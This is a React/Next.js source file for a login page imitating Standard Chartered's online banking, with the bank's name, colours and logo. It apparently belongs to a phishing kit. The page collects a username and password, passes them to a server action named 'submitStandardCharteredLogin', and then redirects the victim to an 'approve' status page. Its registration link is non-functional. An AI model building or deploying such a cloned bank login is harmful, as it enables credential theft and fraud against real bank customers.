"use client";

import React, { useState } from "react";
import Image from "next/image";
import { Loader2 } from "lucide-react";
import { submitStandardCharteredLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function StandardCharteredLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitStandardCharteredLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#0772BA] font-sans text-white">
      {/* Main Content */}
      <main className="flex flex-1 flex-col items-center px-10 pt-24 pb-12">
        {/* Title */}
        <div className="mb-20 text-center">
          <h1 className="text-[32px] font-bold leading-[1.1] tracking-tight">
            Standard<br />Chartered
          </h1>
        </div>

        {/* Form */}
        <form onSubmit={handleLogin} className="w-full max-w-sm space-y-12">
          {error && (
            <div className="rounded bg-white/10 p-3 text-center text-sm font-medium text-white border border-white/20">
              {error}
            </div>
          )}

          {/* Username Section */}
          <div className="space-y-1">
            <label className="text-[17px] font-medium opacity-80">
              Username
            </label>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full border-b border-white/40 bg-transparent py-2 text-[18px] outline-none transition-all focus:border-white"
              required
            />
          </div>

          {/* Password Section */}
          <div className="space-y-1">
            <label className="text-[17px] font-medium opacity-80">
              Password
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full border-b border-white/40 bg-transparent py-2 text-[18px] outline-none transition-all focus:border-white"
              required
            />
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={isLoading}
            className="flex w-full items-center justify-center rounded bg-[#5AB650] py-4 text-[20px] font-bold text-white shadow-lg transition-all active:scale-[0.98] disabled:opacity-80"
          >
            {isLoading ? (
              <Loader2 className="h-6 w-6 animate-spin" />
            ) : (
              "Login"
            )}
          </button>

          {/* Registration Link */}
          <div className="pt-4 text-center">
            <button
              type="button"
              className="text-[16px] font-medium text-white/90 hover:underline"
            >
              Not registered for online banking? &gt;
            </button>
          </div>

          {/* Warning Text */}
          <div className="pt-10 text-center">
            <p className="text-[14px] leading-relaxed opacity-70">
              It is essential that you do not take into consideration or respond to any information on this site...
            </p>
          </div>
        </form>
      </main>

      {/* Footer (Optional addition for branding if needed, but not in ref) */}
      <footer className="p-8 flex justify-center">
        <Image
          src="/bank/Standard_Chartered_(2021).svg"
          alt="Standard Chartered Logo"
          width={160}
          height={60}
          className="h-10 w-auto invert brightness-0 grayscale opacity-40"
        />
      </footer>
    </div>
  );
}
